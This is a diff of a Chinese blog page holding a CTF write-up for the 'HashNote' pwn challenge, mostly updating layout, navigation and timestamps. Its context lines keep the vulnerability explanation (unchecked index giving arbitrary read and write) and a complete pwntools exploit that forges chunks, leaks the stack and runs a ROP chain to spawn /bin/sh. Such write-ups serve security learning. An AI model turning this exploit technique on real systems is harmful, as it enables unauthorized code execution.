@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="(´ΘωΘ&#96;) HashNote准备国赛的时候协会web手给的题，说是春秋云境靶场里渗透出来的是。 逆向分析一打开就是经典无符号，然后是静态编译没有外部库。 虽然乍一看很恶心，但是逆过go之后看这个还是比较眉清目秀的，很容易找到主函数  然后先猜输入输出函数，其中这个put后面的第一个参数都相同，点进去是.bss段上的东西，空的 然后 debug 的时候查看内存可以看到在main之前就已经">
+        <meta name="description" content="准备国赛的时候协会web手给的题，说是春秋云境靶场里渗透出来的是。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="长城杯半决pwn——HashNote">
 <meta property="og:url" content="http://example.com/2024/11/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3pwn%E2%80%94%E2%80%94HashNote/index.html">
 <meta property="og:site_name" content="Z1naX5">
-<meta property="og:description" content="(´ΘωΘ&#96;) HashNote准备国赛的时候协会web手给的题，说是春秋云境靶场里渗透出来的是。 逆向分析一打开就是经典无符号，然后是静态编译没有外部库。 虽然乍一看很恶心，但是逆过go之后看这个还是比较眉清目秀的，很容易找到主函数  然后先猜输入输出函数，其中这个put后面的第一个参数都相同，点进去是.bss段上的东西，空的 然后 debug 的时候查看内存可以看到在main之前就已经">
+<meta property="og:description" content="准备国赛的时候协会web手给的题，说是春秋云境靶场里渗透出来的是。">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130204212.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130205532.png">
@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130210620.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130214235.png">
 <meta property="article:published_time" content="2024-11-30T11:40:22.000Z">
-<meta property="article:modified_time" content="2024-12-01T06:28:03.099Z">
+<meta property="article:modified_time" content="2024-12-02T04:14:18.410Z">
 <meta property="article:author" content="Z1naX5">
 <meta property="article:tag" content="wp">
 <meta property="article:tag" content="学习日志">
@@ -91,7 +91,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":5,"number":true,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#3850AB","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/pic/light_background.jpg","dark":"/pic/dark_background.png"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#363636","dark":"#d2dde8"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":25},"width":{"home":"1200px","pages":"1200px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"Links":{"path":"/links","icon":"fa-regular fa-link"}},"search":{"enable":true,"preload":true},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":10}},"footerStart":"2022/8/17 11:45:14"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":5,"number":true,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#3850AB","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/pic/light_background.jpg","dark":"/pic/dark_background.png"},"title":"Miaoo0bin's Blog","subtitle":{"text":["晚安喵(,,・ω・,,)"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#363636","dark":"#d2dde8"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":25},"width":{"home":"1200px","pages":"1200px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"About":{"path":"/about","icon":"fa-regular fa-user"},"Links":{"path":"/links","icon":"fa-regular fa-link"}},"search":{"enable":true,"preload":true},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":10}},"footerStart":"2022/8/17 11:45:14"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -344,6 +344,23 @@
                             <li class="navbar-item">
                                 <!-- Menu -->
                                 <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
                                    href="/links"
                                         >
                                     <i class="fa-regular fa-link fa-fw"></i>
@@ -425,6 +442,26 @@
                     <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                         
                         <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                            href="/links"
                         >
                             <span>
@@ -454,7 +491,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">20</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">19</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -479,8 +516,12 @@
 
         <div class="article-title relative w-full">
             
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">长城杯半决pwn——HashNote</h1>
+                
+                
+                <img src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130214235.png" alt="长城杯半决pwn——HashNote" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">长城杯半决pwn——HashNote</h1>
                 </div>
             
             </div>
@@ -506,8 +547,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-12-01 14:28:03</span>
-            <span class="mobile">2024-12-01 14:28:03</span>
+            <span class="desktop">2024-12-02 12:14:18</span>
+            <span class="mobile">2024-12-02 12:14:18</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -606,16 +647,16 @@
                       alt="20241130214235"
                 ><br>漏洞点在于这里的 while ，校验如果这个哈希对应的 chunk 如果已经存在那么再看 chunk 内 key 的内容是否相同，如果不同则对于这种相同哈希不同key的情况，再往后分配一个chunk。</p>
 <p>在这里没有检查index的范围，也就是说126之外的index也可以被访问到的 key_data[]之后存储的就是 username<br>insert是读，query是写，那么构造username就可以完成任意地址读写</p>
-<p>接下来是泄露栈地址，主要问题是找一个记录了栈地址的地方，搜索到的wp都是在.bss段上某个地址找到的记录了一些程序加载时栈上的痕迹，可能和c++的静态编译或者和这个题目的一些设置相关，但是应该是不至于把程序逆透了才能得到。</p>
+<p>接下来是泄露栈地址，主要问题是找一个记录了栈地址的地方，搜索到的wp都是在.bss段上某个地址找到的记录了一些程序加载时栈上的痕迹，可能和c++的静态编译或者和这个题目的一些设置相关，但是应该是不至于把程序逆透了才能得到。<br>（或许是通过pwndbg的search可以找到）</p>
 <p>最后的工作：构造相同哈希的key<br>不会，待我请教协会密码手。否则的话就写个脚本爆一下</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./HashNote&#x27;</span></span><br><span class="line"><span class="comment"># libc_path=&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p=remote(&quot;&quot;.)</span></span><br><span class="line">p= process(elf_path)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line"><span class="comment"># libc=ELF(libc_path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">newname</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;New username: &#x27;</span>,newname.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">key,data</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Key: &#x27;</span>,key)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Data: &#x27;</span>,data)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Key: &#x27;</span>,key)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">key,data</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Key: &#x27;</span>,key)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Data: &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x405e7c</span></span><br><span class="line">pop_rsi=<span class="number">0x40974f</span></span><br><span class="line">pop_rax=<span class="number">0x4206ba</span></span><br><span class="line">pop_rdx_rbx=<span class="number">0x53514b</span></span><br><span class="line">syscall=<span class="number">0x4560c6</span></span><br><span class="line"></span><br><span class="line">username=<span class="number">0x5dc980</span></span><br><span class="line">stack=<span class="number">0x5e4fa8</span></span><br><span class="line">ukey=<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------</span></span><br><span class="line">fake_chunk=flat(&#123;</span><br><span class="line">    <span class="number">0</span>:username+<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x10</span>:[username+<span class="number">0x20</span>,<span class="built_in">len</span>(ukey),\</span><br><span class="line">        ukey,<span class="number">0</span>],</span><br><span class="line">    <span class="number">0x30</span>:[stack,<span class="number">0x10</span>]</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Username&#x27;</span>,fake_chunk)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Password: &quot;</span>,<span class="string">b&quot;freep@ssw0rd:3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造</span></span><br><span class="line">insert(<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">1</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span>,<span class="string">b&#x27;test&#x27;</span>) <span class="comment"># 126</span></span><br><span class="line">insert(<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span>,<span class="string">b&#x27;test&#x27;</span>) <span class="comment"># 127 数组越界</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># 任意地址读 leak stack</span></span><br><span class="line">query(<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span>)</span><br><span class="line">main_ret=u64(p.recv(<span class="number">8</span>))-<span class="number">0x1e0</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------</span></span><br><span class="line">fake_chunk=flat(&#123;</span><br><span class="line">    <span class="number">0</span>:username+<span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x20</span>:[username+<span class="number">0x30</span>,<span class="built_in">len</span>(ukey),\</span><br><span class="line">        ukey,<span class="number">0</span>],</span><br><span class="line">    <span class="number">0x40</span>:[main_ret,<span class="number">0x100</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>]</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">change(fake_chunk) <span class="comment"># 准备任意地址写</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line">payload=flat([</span><br><span class="line">    pop_rdi,username+<span class="number">0x50</span>,</span><br><span class="line">    pop_rsi,<span class="number">0</span>,</span><br><span class="line">    pop_rdx_rbx,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    pop_rax,<span class="number">0x3b</span>,</span><br><span class="line">    syscall</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">modify(ukey,payload) <span class="comment"># 任意地址写</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>) <span class="comment"># 退出main，触发rop</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul>
 <li>逆昏头的时候也要适时保持理智</li>
 <li>以及作为攻击者要对各种合法的特殊情况敏感，主动去找特殊情况，比如这道题里不同 key 同哈希的情况。</li>
 </ul>
-<blockquote>
-<p>参考文章：<br><a class="link"   target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat" >pwntools中flat的使用方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.dr0n.top/posts/f249db01/" >https://www.dr0n.top/posts/f249db01/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://fushuling.com/index.php/2024/05/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/" >https://fushuling.com/index.php/2024/05/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat" >pwntools中flat的使用方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.dr0n.top/posts/f249db01/" >https://www.dr0n.top/posts/f249db01/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://fushuling.com/index.php/2024/05/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/" >https://fushuling.com/index.php/2024/05/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
 
         </div>
@@ -631,7 +672,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-12-01 14:28:03
+                    :</strong> 2024-12-02 12:14:18
             </li>
         
         <li>
@@ -705,7 +746,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">长城杯半决pwn——HashNote</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HashNote"><span class="nav-number">1.</span> <span class="nav-text">HashNote</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.3.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">小结</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HashNote"><span class="nav-number">1.</span> <span class="nav-text">HashNote</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">2.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">参考文章：</span></a></li></ol>
 
     </div>
 </div>
